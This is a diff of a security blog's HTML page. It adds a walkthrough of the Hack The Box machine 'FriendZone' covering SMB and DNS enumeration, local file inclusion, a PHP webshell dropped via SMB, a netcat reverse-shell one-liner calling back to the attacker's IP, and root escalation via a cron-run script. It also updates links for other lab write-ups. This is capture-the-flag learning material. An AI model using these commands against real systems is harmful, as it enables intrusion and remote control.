@@ -71,6 +71,96 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-FriendZone" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/19/FriendZone/" class="article-date">
+  <time class="dt-published" datetime="2022-07-20T03:34:51.000Z" itemprop="datePublished">2022-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/19/FriendZone/">FriendZone</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/19/FriendZone/nmap.png">
+the machine opnes ftp,ssh,smbd and ssl
+the port 80 just a picture
+
+<h5 id="SMB-shares-445-x2F-139"><a href="#SMB-shares-445-x2F-139" class="headerlink" title="SMB shares 445&#x2F;139"></a>SMB shares 445&#x2F;139</h5><p>first use smbmap to list shares and permissions</p>
+<pre><code>smbmap -H 10.10.10.123
+</code></pre>
+<img src="/2022/07/19/FriendZone/smbscan.png">
+it can also get using smbclient
+
+<pre><code>smbclient -N -L //10.10.10.123
+</code></pre>
+<p>-N represent null session (or no auth) and -L to list<br><img src="/2022/07/19/FriendZone/smbclient.png"><br>the comment of Files says that its &#x2F;etc&#x2F;Files<br>so we can use nmap to verify</p>
+<pre><code>nmap --script smb-enum-shares.nse -p445 10.10.10.123
+</code></pre>
+<img src="/2022/07/19/FriendZone/nmapscript.png">
+it will give me the path on target to the share
+
+<h6 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h6><p>The Development share is empty:<br><img src="/2022/07/19/FriendZone/Development.png"></p>
+<h6 id="general"><a href="#general" class="headerlink" title="general"></a>general</h6><p>The general share has a single file,we can get it and have a look<br><img src="/2022/07/19/FriendZone/general.png"><br>its a cred<br><img src="/2022/07/19/FriendZone/cred.png"></p>
+<h5 id="TCP-80"><a href="#TCP-80" class="headerlink" title="TCP 80"></a>TCP 80</h5><p>the site give us a new domain <code>friendzoneportal.red</code><br>we now use dirsearch to find some paths<br><img src="/2022/07/19/FriendZone/dirsearch.png"><br>the robots.txt just a phrase<br><img src="/2022/07/19/FriendZone/robots.png"><br>and the wordpress is empty dir</p>
+<h5 id="https-443"><a href="#https-443" class="headerlink" title="https 443"></a>https 443</h5><p>first use the comman name get via nmap to visit <code>https://friendzone.red:443/</code><br>the site just has a picture<br><img src="/2022/07/19/FriendZone/443pic.png"><br>and if we view page source,we can get another path<br><img src="/2022/07/19/FriendZone/443.png"><br>the js&#x2F;js path has a encode string,so we can try to decode it<br><img src="/2022/07/19/FriendZone/jsjs.png"><br>it also have a hint<br><img src="/2022/07/19/FriendZone/jshint.png"><br>i temporarily don’t know what’s the meaning of it</p>
+<h5 id="TCP-x2F-UDP-53"><a href="#TCP-x2F-UDP-53" class="headerlink" title="TCP&#x2F;UDP 53"></a>TCP&#x2F;UDP 53</h5><p>TCP is only used in DNS when the response size is greater than 512 bytes. Typically this is associated with Zone Transfers, where the server give all the information it has for a domain. There’s a few things I could try to enumerate DNS, but the fact that the host is listening on TCP 53 suggests the first thing I should try is a Zone Transfer.<br>I’ll do that with dig. I’ll start with friendzone.htb, and get nothing:<br><img src="/2022/07/19/FriendZone/dig1.png"><br>Since I have a domain name in the TLS certificate, I’ll try that:<br><img src="/2022/07/19/FriendZone/dig2.png"><br>I can also try the domain I got on the first webpage, “friendzoneportal.red”:<br><img src="/2022/07/19/FriendZone/dig3.png"><br>I’ll update my hosts file for each of these:<br><img src="/2022/07/19/FriendZone/host.png"></p>
+<h5 id="administrator1-friendzone-red"><a href="#administrator1-friendzone-red" class="headerlink" title="administrator1.friendzone.red"></a>administrator1.friendzone.red</h5><img src="/2022/07/19/FriendZone/login1.png">
+use the creds we get ,and we can in 
+<img src="/2022/07/19/FriendZone/logindone.png">
+visit /dashboard.php ,and we can find something else
+<img src="/2022/07/19/FriendZone/dashboard.png">
+we add the `?image_id=a.jpg&pagename=timestamp` to the path,and we can get another page
+<img src="/2022/07/19/FriendZone/dashboardpic.png">
+use dirsearch to search the path
+<img src="/2022/07/19/FriendZone/dirsearch2.png">
+it's has a image dir and has two pics
+and it's also has a page called timestamp.php
+
+<h4 id="2-get-webshell-access"><a href="#2-get-webshell-access" class="headerlink" title="2.get webshell access"></a>2.get webshell access</h4><h5 id="Find-LFI"><a href="#Find-LFI" class="headerlink" title="Find LFI"></a>Find LFI</h5><p>because the pic is load by the full path,we can try to find load file inclusion<br>1.image_id<br>The image_id, such as a.jpg is a full file name. I’ll try giving it a php page, which it would load if that file is being shown using include in php. Unfortunately, it just shows a broken image:<br><img src="/2022/07/19/FriendZone/lfi1.png"><br>Looking at the source, I see <code>&lt;img src=&#39;images/timestamp.php&#39;&gt;</code>. I could play with XSS here, and see if I can get it to load a script. For example, if I set <code>image_id=&#39; onerror=&#39;javascript: alert(&quot;XXS HERE&quot;);</code>, I get a pop-up:<br><img src="/2022/07/19/FriendZone/xss.png"><br>The source explains it: <code>&lt;img src=&#39;images/&#39; onerror=&#39;javascript: alert(&quot;XXS HERE&quot;);&#39;&gt;</code><br>2.pagename<br>Since the given example case is <code>timestamp</code>, and there’s a <code>timestamp.php</code> in the same directory, I can assume that this is likely doing a <code>include($_GET[&quot;pagename&quot;] . &quot;.php&quot;)</code>. I can test this by having it point to other php pages.<br>Visiting <code>https://administrator1.friendzone.red/login.php</code> returns: <code>Wrong!</code><br>and we change to pagename to login can also see the same word<br><img src="/2022/07/19/FriendZone/wrong.png"></p>
+<h5 id="read-PHP-resource"><a href="#read-PHP-resource" class="headerlink" title="read PHP resource"></a>read PHP resource</h5><p>I can use this LFI to read source code for these pages using php filters. If I visit <code>pagename=php://filter/convert.base64-encode/resource=dashboard</code>, I can see a long base64 string on the page:<br><img src="/2022/07/19/FriendZone/base64.png"><br>decoding it,and we can find something<br><img src="/2022/07/19/FriendZone/sourcecode.png"><br>we can do the same thing to read upload <code>pagename=php://filter/convert.base64-encode/resource=../uploads/upload</code><br><img src="/2022/07/19/FriendZone/uploadsource.png"></p>
+<h5 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h5><p>I want to use this LFI to include a webshell so I can run commands. I’ll use my smb access to drop a simple php command shell into the Development share, which nmap told me was &#x2F;etc&#x2F;Development.<br><img src="/2022/07/19/FriendZone/cmdphp.png"><br>and upload it to the machine</p>
+<pre><code>smbclient -N //10.10.10.123/Development -c &#39;put cmd.php zyz.php&#39;
+</code></pre>
+<img src="/2022/07/19/FriendZone/zyzphp.png">
+Now, on visiting `https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/zyz&cmd=id`, I get output:
+<img src="/2022/07/19/FriendZone/webshell.png">
+
+<p> I’ll use my go to from the <a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a> and visit: <code>https://administrator1.friendzone.red/dashboard.php?image_id=&amp;pagename=../../../etc/Development/zyz&amp;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;%261|nc 10.10.16.10 4444 &gt;/tmp/f</code> (remembering to encode the &amp; as %26):<br><img src="/2022/07/19/FriendZone/reverse.png"><br>After a shell upgrade <code>(python -c &#39;import pty;pty.spawn(&quot;bash&quot;)&#39;</code>, <code>ctrl-z</code>, <code>stty raw -echo;fg</code>, <code>reset</code>, enter “screen” for terminal type if asked), I’ve got a full shell. And I can get user.txt.<br>In the &#x2F;var&#x2F;www&#x2F; directory, there’s folders for all the different sites, as well as an sql conf file:<br><img src="/2022/07/19/FriendZone/mysql.png"><br>use the password to su friend<br><img src="/2022/07/19/FriendZone/friend.png"></p>
+<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>search around the machine, there has a py script in &#x2F;opt&#x2F;server_admin<br><img src="/2022/07/19/FriendZone/pyscript.png"><br>find &#x2F;tmp can write to upload our <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a></p>
+<pre><code>our machine:python3 -m http.server 80
+target machine:wget http://10.10.16.10/pspy32s
+               chmod +x pspy32s
+       ./pspy32s
+</code></pre>
+<p>and we can find that root was running this script every two minutes:<br><img src="/2022/07/19/FriendZone/script.png"><br>via linpeas.sh,we find a file that friend can write<br><img src="/2022/07/19/FriendZone/friendcanwrite.png"><br>we append the following scripts to the end of it<br><img src="/2022/07/19/FriendZone/append.png"><br>and finally we get the root<br><img src="/2022/07/19/FriendZone/rootflag.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/19/FriendZone/" data-id="cl5tqbzxf00031ycp5w8cgzjh" data-title="FriendZone" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Delivery" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/07/18/Delivery/" class="article-date">
@@ -99,7 +189,7 @@ and add helpdesk.delivery.htb to /etc/hosts
 <pre><code>echo &quot;10.10.10.222 helpdesk.delivery.htb&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <h4 id="2-website"><a href="#2-website" class="headerlink" title="2.website"></a>2.website</h4><p>the port 80 shows nothing,but we can change to <a target="_blank" rel="noopener" href="http://helpdesk.delivery.htb/index.php">http://helpdesk.delivery.htb/index.php</a> to get some information<br><img src="/2022/07/18/Delivery/osTicket.png"><br>it shows it’s run a osTicket structer on 80<br>and on port 8065,it shows another login page<br><img src="/2022/07/18/Delivery/mattermost.png"><br>i first add a user in mattermost and try to find a exploit<br>it need me to varify<br>so let’s use searchsploit osticket and try to exploit<br>all the register need verify<br>as a guest,we can open a new ticket and see it’s feedback<br><img src="/2022/07/18/Delivery/newticket.png"></p>
-<h4 id="3-getting-webshell-access"><a href="#3-getting-webshell-access" class="headerlink" title="3.getting webshell access"></a>3.getting webshell access</h4><p>because the machine can not access to the internet,the verify step is unable<br>but when I created a ticket, it offered the ability to update the ticket over email. I can use that to get the verification email.<br><img src="/2022/07/18/Delivery/viewticket.png"><br>I’ll create a ticket and get the email address for it. Then sign up for a MatterMost account:<br><img src="/2022/07/18/Delivery/step1.png"><br><img src="/2022/07/18/Delivery/step2.png"><br>the default email is <a href="mailto:&#50;&#x32;&#48;&#x30;&#x34;&#x39;&#x33;&#x40;&#100;&#101;&#108;&#105;&#118;&#101;&#114;&#x79;&#x2e;&#104;&#x74;&#x62;">&#50;&#x32;&#48;&#x30;&#x34;&#x39;&#x33;&#x40;&#100;&#101;&#108;&#105;&#118;&#101;&#114;&#x79;&#x2e;&#104;&#x74;&#x62;</a><br>register a new account use <a href="mailto:&#x32;&#x32;&#x30;&#48;&#x34;&#x39;&#x33;&#64;&#x64;&#x65;&#108;&#x69;&#x76;&#101;&#x72;&#121;&#46;&#x68;&#116;&#98;">&#x32;&#x32;&#x30;&#48;&#x34;&#x39;&#x33;&#64;&#x64;&#x65;&#108;&#x69;&#x76;&#101;&#x72;&#121;&#46;&#x68;&#116;&#98;</a><br><img src="/2022/07/18/Delivery/step3.png"><br>check the ticketnum use 2200493<br><img src="/2022/07/18/Delivery/step4.png"><br>and now we get the verify mail<br><img src="/2022/07/18/Delivery/step5.png"><br>verify the link and we can get in<br><img src="/2022/07/18/Delivery/step6.png"><br>in the website,we can see a credential —maildeliverer:Youve_G0t_Mail!<br>and it shows a hint that may password are PleaseSubscribe!<br><img src="/2022/07/18/Delivery/creds.png"><br>then i can try to use creds i just get to ssh the machine<br><img src="/2022/07/18/Delivery/userflag.png"></p>
+<h4 id="3-getting-webshell-access"><a href="#3-getting-webshell-access" class="headerlink" title="3.getting webshell access"></a>3.getting webshell access</h4><p>because the machine can not access to the internet,the verify step is unable<br>but when I created a ticket, it offered the ability to update the ticket over email. I can use that to get the verification email.<br><img src="/2022/07/18/Delivery/viewticket.png"><br>I’ll create a ticket and get the email address for it. Then sign up for a MatterMost account:<br><img src="/2022/07/18/Delivery/step1.png"><br><img src="/2022/07/18/Delivery/step2.png"><br>the default email is <a href="mailto:&#x32;&#x32;&#48;&#x30;&#52;&#x39;&#51;&#x40;&#x64;&#x65;&#108;&#105;&#118;&#101;&#x72;&#x79;&#46;&#x68;&#x74;&#98;">&#x32;&#x32;&#48;&#x30;&#52;&#x39;&#51;&#x40;&#x64;&#x65;&#108;&#105;&#118;&#101;&#x72;&#x79;&#46;&#x68;&#x74;&#98;</a><br>register a new account use <a href="mailto:&#50;&#50;&#x30;&#x30;&#52;&#x39;&#51;&#x40;&#x64;&#101;&#x6c;&#x69;&#118;&#x65;&#114;&#x79;&#x2e;&#x68;&#116;&#98;">&#50;&#50;&#x30;&#x30;&#52;&#x39;&#51;&#x40;&#x64;&#101;&#x6c;&#x69;&#118;&#x65;&#114;&#x79;&#x2e;&#x68;&#116;&#98;</a><br><img src="/2022/07/18/Delivery/step3.png"><br>check the ticketnum use 2200493<br><img src="/2022/07/18/Delivery/step4.png"><br>and now we get the verify mail<br><img src="/2022/07/18/Delivery/step5.png"><br>verify the link and we can get in<br><img src="/2022/07/18/Delivery/step6.png"><br>in the website,we can see a credential —maildeliverer:Youve_G0t_Mail!<br>and it shows a hint that may password are PleaseSubscribe!<br><img src="/2022/07/18/Delivery/creds.png"><br>then i can try to use creds i just get to ssh the machine<br><img src="/2022/07/18/Delivery/userflag.png"></p>
 <h4 id="4-getting-root-access"><a href="#4-getting-root-access" class="headerlink" title="4.getting root access"></a>4.getting root access</h4><p>Mattermost stores it’s configuration in &#x2F;opt&#x2F;mattermost&#x2F;config&#x2F;config.json. The database connection information is in here:<br><img src="/2022/07/18/Delivery/sqlpass.png"></p>
 <p>username:mmuser<br>password:Crack_The_MM_Admin_PW<br>database:mattermost<br><img src="/2022/07/18/Delivery/database.png"><br>we can get username and password from the table User</p>
 <pre><code>select Username,Password from Users;
@@ -111,7 +201,7 @@ and add helpdesk.delivery.htb to /etc/hosts
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/18/Delivery/" data-id="cl5s5p57i0001k4cp1ymycikk" data-title="Delivery" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/18/Delivery/" data-id="cl5tqbzxc00021ycp4ucv36bf" data-title="Delivery" class="article-share-link">Share</a>
       
       
       
@@ -181,7 +271,7 @@ and use the command to get a interactive shell
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/17/Horizontall/" data-id="cl5s5p57m0003k4cpev94dh41" data-title="Horizontall" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/17/Horizontall/" data-id="cl5tqbzxh00041ycpakasb4vy" data-title="Horizontall" class="article-share-link">Share</a>
       
       
       
@@ -241,7 +331,7 @@ nc -lvnp 8888
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/16/Previse/" data-id="cl5s5p57o0005k4cpc33he26m" data-title="Previse" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/16/Previse/" data-id="cl5tqbzxj00061ycpfq5z6lpw" data-title="Previse" class="article-share-link">Share</a>
       
       
       
@@ -305,7 +395,7 @@ Now let's run snap as the root user to make use of the snap package we created:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/16/Armageddon/" data-id="cl5s5p57d0000k4cp4m5u6ipt" data-title="Armageddon" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/16/Armageddon/" data-id="cl5tqbzx500001ycpcit259nk" data-title="Armageddon" class="article-share-link">Share</a>
       
       
       
@@ -383,7 +473,7 @@ we can first see what's configured
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/15/Forlic/" data-id="cl5s5p57k0002k4cp81cz2l5w" data-title="Forlic" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/15/Forlic/" data-id="cl5tqbzxa00011ycp8pfe1z4s" data-title="Forlic" class="article-share-link">Share</a>
       
       
       
@@ -428,7 +518,7 @@ we can first see what's configured
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl5s5p57u0006k4cp52kg9eyd" data-title="Scriptkiddle" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl5tqbzxk00071ycpc6npgete" data-title="Scriptkiddle" class="article-share-link">Share</a>
       
       
       
@@ -478,7 +568,7 @@ so we can try run monitor.sh and the color of text changed
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl5s5p57n0004k4cp2vux7ibq" data-title="Nibbles" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl5tqbzxi00051ycp5p7e2wzs" data-title="Nibbles" class="article-share-link">Share</a>
       
       
       
@@ -582,7 +672,7 @@ line 3 of code
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl5s5p57v0007k4cpcmk23z0e" data-title="first_blog" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl5tqbzxm00081ycpcn239kyy" data-title="first_blog" class="article-share-link">Share</a>
       
       
       
@@ -625,6 +715,10 @@ line 3 of code
       <ul>
         
           <li>
+            <a href="/2022/07/19/FriendZone/">FriendZone</a>
+          </li>
+        
+          <li>
             <a href="/2022/07/18/Delivery/">Delivery</a>
           </li>
         
@@ -638,10 +732,6 @@ line 3 of code
         
           <li>
             <a href="/2022/07/16/Armageddon/">Armageddon</a>
-          </li>
-        
-          <li>
-            <a href="/2022/07/15/Forlic/">Forlic</a>
           </li>
         
       </ul>
